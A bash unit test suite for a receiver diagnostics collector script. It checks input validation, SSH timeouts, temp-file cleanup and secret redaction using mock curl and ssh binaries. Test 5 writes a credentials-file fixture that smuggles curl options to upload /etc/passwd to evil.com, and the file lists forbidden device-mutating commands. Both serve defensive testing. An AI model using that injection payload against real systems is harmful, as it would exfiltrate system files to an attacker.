#!/usr/bin/env bash
# Copyright (c) 2025 ManuGH
# Licensed under the PolyForm Noncommercial License 1.0.0

set -euo pipefail

# Executable Unit Test Suite for scripts/collect_receiver_diagnostics.sh
SCRIPT_UNDER_TEST="$(pwd)/scripts/collect_receiver_diagnostics.sh"
TEST_TMP_DIR="$(mktemp -d /tmp/collector_test_XXXXXX)"

cleanup() {
    rm -rf "${TEST_TMP_DIR}"
}
trap cleanup EXIT

echo "=== Running Comprehensive Collector Security & Safety Unit Tests ==="

# Test 1: RejectsCredentialBearingURL
echo -n "Test 1: RejectsCredentialBearingURL... "
if "${SCRIPT_UNDER_TEST}" "http://admin:secret123@192.168.1.50" >/dev/null 2>&1; then
    echo "FAILED! Script allowed credential-bearing URL!"
    exit 1
fi
echo "PASSED"

# Test 2: DoesNotInvokeMutatingEndpoints
echo -n "Test 2: DoesNotInvokeMutatingEndpoints... "
FORBIDDEN_TERMS="zap|powerstate|message|restart|reboot|timeradd|timerdelete|timerchange|record"
if grep -Ei "(${FORBIDDEN_TERMS})" "${SCRIPT_UNDER_TEST}" | grep -v "#"; then
    echo "FAILED! Found forbidden mutation commands in script!"
    exit 1
fi
echo "PASSED"

# Test 3: WritesOnlyBelowDiagnosticsDirectory
echo -n "Test 3: WritesOnlyBelowDiagnosticsDirectory... "
if grep -F "docs/" "${SCRIPT_UNDER_TEST}" | grep -v "#"; then
    echo "FAILED! Found output path targeting docs/!"
    exit 1
fi
echo "PASSED"

# Test 4: SSHCommandIsBounded
echo -n "Test 4: SSHCommandIsBounded... "
if ! grep -q "timeout 15s ssh" "${SCRIPT_UNDER_TEST}"; then
    echo "FAILED! SSH command is not bounded with 'timeout 15s ssh'!"
    exit 1
fi
echo "PASSED"

# Test 5: CredentialsFileCannotInjectCurlOptions
echo -n "Test 5: CredentialsFileCannotInjectCurlOptions... "
BAD_CRED_FILE="${TEST_TMP_DIR}/bad_cred.cfg"
cat << 'EOF' > "${BAD_CRED_FILE}"
username=admin
password=pass
upload-file=/etc/passwd
url=http://evil.com
EOF
chmod 600 "${BAD_CRED_FILE}"

if "${SCRIPT_UNDER_TEST}" "192.168.1.50" "" "${BAD_CRED_FILE}" >/dev/null 2>&1; then
    echo "FAILED! Collector accepted credentials file containing dangerous curl options!"
    exit 1
fi
echo "PASSED"

# Test 6: MissingJQFailsBeforeCollection
echo -n "Test 6: MissingJQFailsBeforeCollection... "
FAKE_PATH_DIR="${TEST_TMP_DIR}/no_jq_path"
mkdir -p "${FAKE_PATH_DIR}"
for tool in sh bash curl ssh timeout grep sed awk cat date mkdir rm stat shasum sha256sum; do
    TOOL_PATH="$(which ${tool} 2>/dev/null || true)"
    if [ -n "${TOOL_PATH}" ]; then
        ln -s "${TOOL_PATH}" "${FAKE_PATH_DIR}/${tool}"
    fi
done
if PATH="${FAKE_PATH_DIR}" "${SCRIPT_UNDER_TEST}" "192.168.1.1" >/dev/null 2>&1; then
    echo "FAILED! Collector ran despite missing 'jq' dependency!"
    exit 1
fi
echo "PASSED"

# Test 7: InterruptedRunRemovesRawTemporaryFiles
echo -n "Test 7: InterruptedRunRemovesRawTemporaryFiles... "
MOCK_EXEC_DIR="${TEST_TMP_DIR}/cleanup_run"
mkdir -p "${MOCK_EXEC_DIR}"
(
    cd "${MOCK_EXEC_DIR}"
    "${SCRIPT_UNDER_TEST}" "http://127.0.0.1:1" >/dev/null 2>&1 &
    PID=$!
    sleep 0.05
    kill -INT "${PID}" 2>/dev/null || true
    wait "${PID}" 2>/dev/null || true
) || true

# Verify no xg2g_collector_* temporary directories leaked in /tmp
LEAKED="$(find /tmp -maxdepth 2 -name "xg2g_collector_*" -type d 2>/dev/null || true)"
if [ -n "${LEAKED}" ]; then
    echo "FAILED! Leaked temporary directory: ${LEAKED}"
    exit 1
fi
echo "PASSED"

# Test 8: Comprehensive Executable Run with Mock Binaries (Fake curl + Fake ssh)
echo -n "Test 8: ExecutableMockRunAndRedactionValidation... "
MOCK_BIN_DIR="${TEST_TMP_DIR}/mock_bin"
mkdir -p "${MOCK_BIN_DIR}"

# Create Fake curl binary with secret tokens and custom Content-Type header
cat << 'EOF' > "${MOCK_BIN_DIR}/curl"
#!/usr/bin/env bash
out_file=""
url=""
while [[ $# -gt 0 ]]; do
    case "$1" in
        -o) out_file="$2"; shift 2 ;;
        http://*|https://*) url="$1"; shift ;;
        *) shift ;;
    esac
done

if [[ "${url}" == *"/api/about" ]]; then
    if [ -n "${out_file}" ]; then
        echo '{"result": true, "receiver_name": "Vu+ Uno 4K", "token": "secret_token_abc"}' > "${out_file}"
    fi
    printf "200\napplication/json; charset=utf-8"
else
    if [ -n "${out_file}" ]; then
        echo '{"result": false, "reason": "Unauthorized token=super_secret_123 password=my_secret_pass"}' > "${out_file}"
    fi
    printf "401\ntext/html"
fi
EOF
chmod +x "${MOCK_BIN_DIR}/curl"

# Create Fake timeout / ssh binary returning mock proc/sys data and secrets
cat << 'EOF' > "${MOCK_BIN_DIR}/timeout"
#!/usr/bin/env bash
# Mock timeout wrapper for ssh
shift 2 # skip 15s ssh
target_ssh="$1"
shift
cmd="$1"

if [[ "${cmd}" == *"nim_sockets"* ]]; then
    echo "NIM Socket 0: DVB-S2 FBC (secret_nim_pass=1234)"
    exit 0
else
    echo "SSH Error: Connection failed for IP 10.10.55.64 token=secret_ssh_key" >&2
    exit 1
fi
EOF
chmod +x "${MOCK_BIN_DIR}/timeout"

# Symlink essential system tools to MOCK_BIN_DIR
for tool in sh bash grep sed awk cat date mkdir rm stat shasum sha256sum jq; do
    TOOL_PATH="$(which ${tool} 2>/dev/null || true)"
    if [ -n "${TOOL_PATH}" ]; then
        ln -s "${TOOL_PATH}" "${MOCK_BIN_DIR}/${tool}" 2>/dev/null || true
    fi
done

MOCK_RUN_DIR="${TEST_TMP_DIR}/mock_run"
mkdir -p "${MOCK_RUN_DIR}"

# Run collector in mock environment with fake target & fake SSH
(
    cd "${MOCK_RUN_DIR}"
    PATH="${MOCK_BIN_DIR}:${PATH}" "${SCRIPT_UNDER_TEST}" "192.168.1.100" "root@192.168.1.100" > "${TEST_TMP_DIR}/mock_run.log" 2>&1
)

MANIFEST_FILE="$(find "${MOCK_RUN_DIR}/var/diagnostics/enigma2" -name "manifest.json" | head -n 1)"
if [ -z "${MANIFEST_FILE}" ] || [ ! -f "${MANIFEST_FILE}" ]; then
    echo "FAILED! Manifest file was not created!"
    exit 1
fi

DIAG_DIR="$(dirname "${MANIFEST_FILE}")"

# Assert 8.1: Secret tokens MUST NOT exist anywhere in the output directory
if grep -R "secret_token_abc" "${DIAG_DIR}" >/dev/null 2>&1; then
    echo "FAILED! Redaction check failed: found secret_token_abc in output!"
    exit 1
fi
if grep -R "super_secret_123" "${DIAG_DIR}" >/dev/null 2>&1; then
    echo "FAILED! Redaction check failed: found super_secret_123 in output!"
    exit 1
fi
if grep -R "secret_nim_pass" "${DIAG_DIR}" >/dev/null 2>&1; then
    echo "FAILED! Redaction check failed: found secret_nim_pass in SSH output!"
    exit 1
fi
if grep -R "secret_ssh_key" "${DIAG_DIR}" >/dev/null 2>&1; then
    echo "FAILED! Redaction check failed: found secret_ssh_key in SSH error output!"
    exit 1
fi

# Assert 8.2: Redaction markers MUST exist in output
if ! grep -R "\[REDACTED\]" "${DIAG_DIR}" >/dev/null 2>&1; then
    echo "FAILED! Redaction check failed: no [REDACTED] markers found!"
    exit 1
fi

# Assert 8.3: Manifest contains actual captured Content-Type
ABOUT_CT="$(jq -r '.probes[] | select(.probe_id=="about") | .content_type' "${MANIFEST_FILE}")"
if [ "${ABOUT_CT}" != "application/json" ]; then
    echo "FAILED! Manifest failed to capture actual content-type (got '${ABOUT_CT}')!"
    exit 1
fi

# Assert 8.4: Single valid status code (not 000000)
DEVINFO_HTTP="$(jq -r '.probes[] | select(.probe_id=="deviceinfo") | .http_status' "${MANIFEST_FILE}")"
if [ "${DEVINFO_HTTP}" != "401" ]; then
    echo "FAILED! Manifest http_status invalid (got '${DEVINFO_HTTP}')!"
    exit 1
fi

# Assert 8.5: SSH failure is recorded as FAILED in manifest
SSH_STATUS="$(jq -r '.probes[] | select(.probe_id=="receiver_identity") | .status' "${MANIFEST_FILE}")"
if [ "${SSH_STATUS}" != "FAILED" ]; then
    echo "FAILED! SSH failure was not recorded as FAILED in manifest (got '${SSH_STATUS}')!"
    exit 1
fi

echo "PASSED"

# Test 9: EveryProbeAppearsExactlyOnce
echo -n "Test 9: EveryProbeAppearsExactlyOnce... "
PROBE_COUNT="$(jq -r '.probes | length' "${MANIFEST_FILE}")"

# 8 HTTP probes + 6 SSH probes = 14 total probes
if [ "${PROBE_COUNT}" -ne 14 ]; then
    echo "FAILED! Expected 14 total probes in manifest, got ${PROBE_COUNT}!"
    exit 1
fi

UNIQUE_PROBES="$(jq -r '.probes[].probe_id' "${MANIFEST_FILE}" | sort | uniq -d)"
if [ -n "${UNIQUE_PROBES}" ]; then
    echo "FAILED! Found duplicate probe IDs in manifest: ${UNIQUE_PROBES}"
    exit 1
fi
echo "PASSED"

echo "=== All 9 Comprehensive Collector Safety Unit Tests PASSED ==="
